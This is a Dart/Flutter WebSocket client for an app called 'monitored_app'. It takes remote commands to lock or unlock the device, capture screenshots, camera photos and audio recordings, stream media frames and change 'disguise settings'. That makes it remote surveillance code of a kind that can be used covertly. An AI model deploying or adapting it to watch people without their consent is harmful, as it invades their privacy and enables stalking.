import 'dart:async';
import 'dart:convert';
import 'package:flutter/foundation.dart';
import 'package:monitored_app/core/services/data_collector_service.dart';
import 'package:monitored_app/core/services/security_service.dart';
import 'package:monitored_app/core/services/database_service.dart';
import 'package:web_socket_channel/web_socket_channel.dart';
import 'package:web_socket_channel/io.dart';
import 'package:monitored_app/app/constants.dart';
import 'package:monitored_app/core/services/storage_service.dart';
import 'package:monitored_app/core/utils/device_utils.dart';
import 'package:monitored_app/core/services/unlock_service.dart';
import 'package:monitored_app/app/locator.dart';

class WebSocketService {
  WebSocketChannel? _channel;
  StreamSubscription? _subscription;
  final StorageService _storageService = locator<StorageService>();

  Timer? _reconnectTimer;
  Timer? _heartbeatTimer;
  bool _isConnected = false;
  int _reconnectAttempts = 0;

  // Message handlers for different message types
  final Map<String, Function(Map<String, dynamic>)> _messageHandlers = {};
  
  // P2P Signaling callback (legacy support)
  Function(Map<String, dynamic>)? _p2pSignalingCallback;

  WebSocketService();

  bool get isConnected => _isConnected;

  Future<void> connect() async {
    if (_channel != null) {
      await disconnect();
    }

    try {
      final token = await _storageService.read(AppConstants.tokenKey);
      
      // FIX: Prioritize backend-assigned UUID over local device identifier
      // After pairing, the backend returns a UUID (e.g., "602fc129-...") 
      // that should be used for WebSocket connection
      String? deviceId = await _storageService.read(AppConstants.deviceIdKey);
      deviceId ??= await DeviceUtils.getDeviceIdentifier();

      if (token == null || deviceId.isEmpty) {
        debugPrint('WebSocket: No token or device ID found');
        return;
      }

      debugPrint('WebSocket: Connecting with deviceId=$deviceId');
      final uri = Uri.parse(
          '${AppConstants.wsBaseUrl}/ws/device/$deviceId/?token=$token');

      _channel = IOWebSocketChannel.connect(
        uri,
        pingInterval: const Duration(seconds: 30),
      );

      _subscription = _channel!.stream.listen(
        _onMessage,
        onError: _onError,
        onDone: _onDone,
      );

      _isConnected = true;
      _reconnectAttempts = 0;

      // Start sending heartbeats
      _startHeartbeat();

      debugPrint('WebSocket: Connected');
    } catch (e) {
      debugPrint('WebSocket connection error: $e');
      _scheduleReconnect();
    }
  }

  Future<void> disconnect() async {
    _stopHeartbeat();
    _cancelReconnect();

    if (_subscription != null) {
      await _subscription!.cancel();
      _subscription = null;
    }

    if (_channel != null) {
      await _channel!.sink.close();
      _channel = null;
    }

    _isConnected = false;
    debugPrint('WebSocket: Disconnected');
  }

  void _onMessage(dynamic message) {
    try {
      final data = jsonDecode(message);
      final messageType = data['type'];

      debugPrint('WebSocket: Received message type: $messageType');

      // Check if there's a specific handler for this message type
      final handler = _messageHandlers[messageType];
      if (handler != null) {
        handler(data);
        return;
      }

      // Fallback to legacy switch statement
      switch (messageType) {
        case 'device_command':
          _handleCommand(data);
          break;
        case 'device_status':
          // Handle status update if needed
          break;
        case 'p2p_signaling':
        case 'webrtc_signaling':
          _handleP2PSignaling(data);
          break;
        case 'peer_connection_request':
          _handlePeerConnectionRequest(data);
          break;
        default:
          debugPrint('WebSocket: Unknown message type: $messageType');
      }
    } catch (e) {
      debugPrint('WebSocket: Error processing message: $e');
    }
  }

  void _handleUnlockCommand(Map<String, dynamic> data) async {
    final senderId = data['sender_id'];
    debugPrint('WebSocket: Unlock command received from: $senderId');

    bool success = false;
    String message = '';

    try {
      if (!locator.isRegistered<UnlockService>()) {
        throw StateError('UnlockService is not registered');
      }
      final unlockService = locator<UnlockService>();
      success = await unlockService.unlockDevice();
      message =
          success ? 'Device unlocked successfully' : 'Failed to unlock device';
    } catch (e) {
      message = 'Error unlocking device: $e';
    }

    // Send response back
    _sendMessage({
      'type': 'unlock_response',
      'success': success,
      'message': message,
    });
  }

  void _sendMessage(Map<String, dynamic> message) {
    if (_channel != null && _isConnected) {
      _channel!.sink.add(jsonEncode(message));
    }
  }

  void _onError(error) {
    debugPrint('WebSocket error: $error');
    _isConnected = false;
    _scheduleReconnect();
  }

  void _onDone() {
    debugPrint('WebSocket done');
    _isConnected = false;
    _scheduleReconnect();
  }

  void _scheduleReconnect() {
    _cancelReconnect();

    // Exponential backoff for reconnection attempts
    final delay = _calculateReconnectDelay();

    debugPrint('WebSocket: Scheduling reconnect in ${delay.inSeconds} seconds');

    _reconnectTimer = Timer(delay, () {
      connect();
    });
  }

  Duration _calculateReconnectDelay() {
    // Exponential backoff with maximum delay of 1 minute
    _reconnectAttempts++;
    final seconds =
        _reconnectAttempts > 6 ? 60 : (1 << _reconnectAttempts); // 2^n seconds
    return Duration(seconds: seconds);
  }

  void _cancelReconnect() {
    if (_reconnectTimer != null) {
      _reconnectTimer!.cancel();
      _reconnectTimer = null;
    }
  }

  void _startHeartbeat() {
    _stopHeartbeat();

    _heartbeatTimer = Timer.periodic(const Duration(seconds: 30), (timer) {
      if (_isConnected) {
        _sendMessage({
          'type': 'heartbeat',
          'timestamp': DateTime.now().toUtc().toIso8601String(),
        });
      }
    });
  }

  void _stopHeartbeat() {
    if (_heartbeatTimer != null) {
      _heartbeatTimer!.cancel();
      _heartbeatTimer = null;
    }
  }

  // Send a status update to the server (battery, online status, etc.)
  void sendStatusUpdate({
    required int batteryLevel,
    required bool isCharging,
    Map<String, dynamic>? securityStatus,
  }) {
    if (!_isConnected) return;

    final message = {
      'type': 'status_update',
      'status': 'active',
      'battery': batteryLevel,
      'is_charging': isCharging,
      'timestamp': DateTime.now().toUtc().toIso8601String(),
    };

    // Add security status if provided
    if (securityStatus != null) {
      message['security'] = securityStatus;
    }

    _sendMessage(message);
  }

  // Send security event notification
  void sendSecurityAlert({
    required String alertType,
    required String description,
    required String severity,
    Map<String, dynamic>? metadata,
  }) {
    if (!_isConnected) return;

    _sendMessage({
      'type': 'security_alert',
      'alert_type': alertType,
      'description': description,
      'severity': severity,
      'metadata': metadata ?? {},
      'timestamp': DateTime.now().toUtc().toIso8601String(),
    });
  }

  void _handleCommand(Map<String, dynamic> data) {
    final command = data['command'];

    switch (command) {
      case 'unlock_device':
        _handleUnlockCommand(data);
        break;
      case 'lock_device':
        _handleLockDeviceCommand(data);
        break;
      case 'capture_media':
        _handleCaptureMediaCommand(data);
        break;
      case 'update_disguise_settings':
        _handleUpdateDisguiseSettingsCommand(data);
        break;
      case 'configure_protection':
        _handleConfigureProtectionCommand(data);
        break;
      default:
        debugPrint('WebSocket: Unknown command: $command');
    }
  }

  void _handleCaptureMediaCommand(Map<String, dynamic> data) async {
    final mediaType = data['media_type']; // 'screenshot', 'photo', 'audio'
    final senderId = data['sender_id'];
    final commandId = data['command_id'];

    debugPrint(
        'WebSocket: Media capture command received: $mediaType from: $senderId');

    bool success = false;
    String message = '';
    Map<String, dynamic>? mediaData;

    try {
      // Get reference to the MediaCollector
      final mediaCollector = locator<DataCollectorService>().mediaCollector;

      // Execute the appropriate capture method
      switch (mediaType) {
        case 'screenshot':
          mediaData = await mediaCollector.captureScreenshot();
          break;
        case 'photo':
          final useFrontCamera = data['front_camera'] ?? false;
          mediaData =
              await mediaCollector.capturePhoto(frontCamera: useFrontCamera);
          break;
        case 'audio':
          final duration = data['duration_seconds'] ?? 30;
          mediaData =
              await mediaCollector.recordAudio(durationSeconds: duration);
          break;
      }

      success = mediaData != null;
      message =
          success ? 'Media captured successfully' : 'Failed to capture media';
    } catch (e) {
      message = 'Error capturing media: $e';
    }

    // Send response back
    _sendMessage({
      'type': 'media_capture_response',
      'success': success,
      'message': message,
      'command_id': commandId,
      'media_data': mediaData,
    });
  }

  void _handleLockDeviceCommand(Map<String, dynamic> data) async {
    final senderId = data['sender_id'];
    final commandId = data['command_id'];
    final lockDuration = data['lock_duration_minutes'] ?? 60;

    debugPrint(
        'WebSocket: Lock device command received from: $senderId for $lockDuration minutes');

    bool success = false;
    String message = '';

    try {
      // Access security service to lock device
      final securityService = locator<SecurityService>();
      success = await securityService.lockDevice(durationMinutes: lockDuration);

      message =
          success ? 'Device locked successfully' : 'Failed to lock device';

      // Log security event
      final databaseService = locator<DatabaseService>();
      await databaseService.insertSecurityAuditEvent(
        eventType: 'device_lock',
        description: 'Device locked remotely for $lockDuration minutes',
        severity: 'WARNING',
        metadata: {
          'sender_id': senderId,
          'command_id': commandId,
          'lock_duration_minutes': lockDuration,
          'success': success,
        },
      );
    } catch (e) {
      message = 'Error locking device: $e';
      debugPrint('Error in lock device command: $e');
    }

    // Send response back
    _sendMessage({
      'type': 'lock_device_response',
      'success': success,
      'message': message,
      'command_id': commandId,
    });
  }

  void _handleUpdateDisguiseSettingsCommand(Map<String, dynamic> data) async {
    final senderId = data['sender_id'];
    final commandId = data['command_id'];
    final disguiseSettings = data['disguise_settings'] as Map<String, dynamic>?;

    debugPrint(
        'WebSocket: Update disguise settings command received from: $senderId');

    bool success = false;
    String message = '';

    try {
      if (disguiseSettings == null) {
        throw Exception('No disguise settings provided');
      }

      // Access security service to update disguise settings
      final securityService = locator<SecurityService>();
      success = await securityService.updateDisguiseSettings(disguiseSettings);

      message = success
          ? 'Disguise settings updated successfully'
          : 'Failed to update disguise settings';

      // Log security event
      final databaseService = locator<DatabaseService>();
      await databaseService.insertSecurityAuditEvent(
        eventType: 'disguise_settings_update',
        description: 'Disguise settings updated remotely',
        severity: 'INFO',
        metadata: {
          'sender_id': senderId,
          'command_id': commandId,
          'settings_keys': disguiseSettings.keys.toList(),
          'success': success,
        },
      );
    } catch (e) {
      message = 'Error updating disguise settings: $e';
      debugPrint('Error in update disguise settings command: $e');
    }

    // Send response back
    _sendMessage({
      'type': 'disguise_settings_response',
      'success': success,
      'message': message,
      'command_id': commandId,
    });
  }

  void _handleConfigureProtectionCommand(Map<String, dynamic> data) async {
    final senderId = data['sender_id'];
    final commandId = data['command_id'];
    final protectionConfig = data['protection_config'] as Map<String, dynamic>?;

    debugPrint(
        'WebSocket: Configure protection command received from: $senderId');

    bool success = false;
    String message = '';

    try {
      if (protectionConfig == null) {
        throw Exception('No protection configuration provided');
      }

      // Access security service to configure protection
      final securityService = locator<SecurityService>();
      success = await securityService.configureProtection(protectionConfig);

      message = success
          ? 'Protection configured successfully'
          : 'Failed to configure protection';

      // Log security event
      final databaseService = locator<DatabaseService>();
      await databaseService.insertSecurityAuditEvent(
        eventType: 'protection_config_update',
        description: 'Protection configuration updated remotely',
        severity: 'WARNING',
        metadata: {
          'sender_id': senderId,
          'command_id': commandId,
          'config_keys': protectionConfig.keys.toList(),
          'success': success,
        },
      );
    } catch (e) {
      message = 'Error configuring protection: $e';
      debugPrint('Error in configure protection command: $e');
    }

    // Send response back
    _sendMessage({
      'type': 'protection_config_response',
      'success': success,
      'message': message,
      'command_id': commandId,
    });
  }

  // P2P Signaling methods
  void setP2PSignalingCallback(Function(Map<String, dynamic>) callback) {
    _p2pSignalingCallback = callback;
  }

  void _handleP2PSignaling(Map<String, dynamic> data) {
    debugPrint('WebSocket: P2P signaling message received');

    if (_p2pSignalingCallback != null) {
      try {
        _p2pSignalingCallback!(data['signaling_data']);
      } catch (e) {
        debugPrint('WebSocket: Error in P2P signaling callback: $e');
      }
    }
    
    // Also trigger message handlers
    final handler = _messageHandlers['webrtc_signaling'];
    if (handler != null) {
      handler(data);
    }
  }

  void _handlePeerConnectionRequest(Map<String, dynamic> data) {
    debugPrint('WebSocket: Peer connection request received');
    
    final handler = _messageHandlers['peer_connection_request'];
    if (handler != null) {
      handler(data);
    }
  }

  // Add message handler for specific message types
  void addMessageHandler(String messageType, Function(Map<String, dynamic>) handler) {
    _messageHandlers[messageType] = handler;
    debugPrint('WebSocket: Handler added for message type: $messageType');
  }

  // Remove message handler
  void removeMessageHandler(String messageType) {
    _messageHandlers.remove(messageType);
    debugPrint('WebSocket: Handler removed for message type: $messageType');
  }

  // Send generic message through WebSocket
  Future<bool> sendMessage(Map<String, dynamic> message) async {
    if (!_isConnected || _channel == null) {
      debugPrint('WebSocket: Cannot send message - not connected');
      return false;
    }

    try {
      // Add timestamp and device identifier
      message['timestamp'] = DateTime.now().toUtc().toIso8601String();
      message['device_id'] = await DeviceUtils.getDeviceIdentifier();
      
      _sendMessage(message);
      return true;
    } catch (e) {
      debugPrint('WebSocket: Error sending message: $e');
      return false;
    }
  }

  void sendP2PSignalingMessage(Map<String, dynamic> signalingData) {
    if (!_isConnected) {
      debugPrint('WebSocket: Not connected, cannot send P2P signaling message');
      return;
    }

    _sendMessage({
      'type': 'p2p_signaling',
      'signaling_data': signalingData,
      'timestamp': DateTime.now().toUtc().toIso8601String(),
    });
  }

  // Send P2P connection request
  void requestP2PConnection(
      String targetDeviceId, Map<String, dynamic>? metadata) {
    if (!_isConnected) {
      debugPrint(
          'WebSocket: Not connected, cannot send P2P connection request');
      return;
    }

    _sendMessage({
      'type': 'p2p_connection_request',
      'target_device_id': targetDeviceId,
      'metadata': metadata ?? {},
      'timestamp': DateTime.now().toUtc().toIso8601String(),
    });
  }

  // Notify about P2P connection status
  void notifyP2PConnectionStatus(
      String peerId, String status, Map<String, dynamic>? details) {
    if (!_isConnected) {
      debugPrint('WebSocket: Not connected, cannot send P2P connection status');
      return;
    }

    _sendMessage({
      'type': 'p2p_connection_status',
      'peer_id': peerId,
      'status': status, // 'connected', 'disconnected', 'failed'
      'details': details ?? {},
      'timestamp': DateTime.now().toUtc().toIso8601String(),
    });
  }

  // Emergency mode methods
  Future<void> sendEmergencyAlert(Map<String, dynamic> emergencyData) async {
    if (!_isConnected) {
      debugPrint('WebSocket: Not connected, cannot send emergency alert');
      return;
    }

    debugPrint('WebSocket: Sending emergency alert');
    _sendMessage({
      'type': 'emergency_alert',
      'priority': 'critical',
      ...emergencyData,
      'timestamp': DateTime.now().toUtc().toIso8601String(),
    });
  }

  Future<void> sendEmergencyHeartbeat(
      Map<String, dynamic> heartbeatData) async {
    if (!_isConnected) {
      debugPrint('WebSocket: Not connected, cannot send emergency heartbeat');
      return;
    }

    _sendMessage({
      'type': 'emergency_heartbeat',
      'priority': 'high',
      ...heartbeatData,
      'timestamp': DateTime.now().toUtc().toIso8601String(),
    });
  }

  Future<void> sendEmergencyDeactivation(
      Map<String, dynamic> deactivationData) async {
    if (!_isConnected) {
      debugPrint(
          'WebSocket: Not connected, cannot send emergency deactivation');
      return;
    }

    debugPrint('WebSocket: Sending emergency deactivation');
    _sendMessage({
      'type': 'emergency_deactivated',
      'priority': 'high',
      ...deactivationData,
      'timestamp': DateTime.now().toUtc().toIso8601String(),
    });
  }

  Future<void> sendEmergencyMessage(Map<String, dynamic> messageData) async {
    if (!_isConnected) {
      debugPrint('WebSocket: Not connected, cannot send emergency message');
      return;
    }

    _sendMessage({
      'type': 'emergency_message',
      'priority': 'high',
      ...messageData,
      'timestamp': DateTime.now().toUtc().toIso8601String(),
    });
  }

  // Media streaming methods for compatibility with media collectors
  Future<void> sendStreamFrame(
      List<int> frameData, Map<String, dynamic> metadata) async {
    if (!_isConnected) {
      debugPrint('WebSocket: Not connected, cannot send stream frame');
      return;
    }

    _sendMessage({
      'type': 'stream_frame',
      'frame_data': base64Encode(frameData),
      'metadata': metadata,
      'timestamp': DateTime.now().toUtc().toIso8601String(),
    });
  }

  Future<void> sendStreamBuffer(List<int> bufferData, String streamType) async {
    if (!_isConnected) {
      debugPrint('WebSocket: Not connected, cannot send stream buffer');
      return;
    }

    _sendMessage({
      'type': 'stream_buffer',
      'buffer_data': base64Encode(bufferData),
      'stream_type': streamType,
      'timestamp': DateTime.now().toUtc().toIso8601String(),
    });
  }

  Future<void> sendMediaData(Map<String, dynamic> mediaData) async {
    if (!_isConnected) {
      debugPrint('WebSocket: Not connected, cannot send media data');
      return;
    }

    _sendMessage({
      'type': 'media_data',
      'data': mediaData,
      'timestamp': DateTime.now().toUtc().toIso8601String(),
    });
  }

  Future<void> sendMediaAlert(
      String alertType, Map<String, dynamic> alertData) async {
    if (!_isConnected) {
      debugPrint('WebSocket: Not connected, cannot send media alert');
      return;
    }

    _sendMessage({
      'type': 'media_alert',
      'alert_type': alertType,
      'alert_data': alertData,
      'timestamp': DateTime.now().toUtc().toIso8601String(),
    });
  }
}
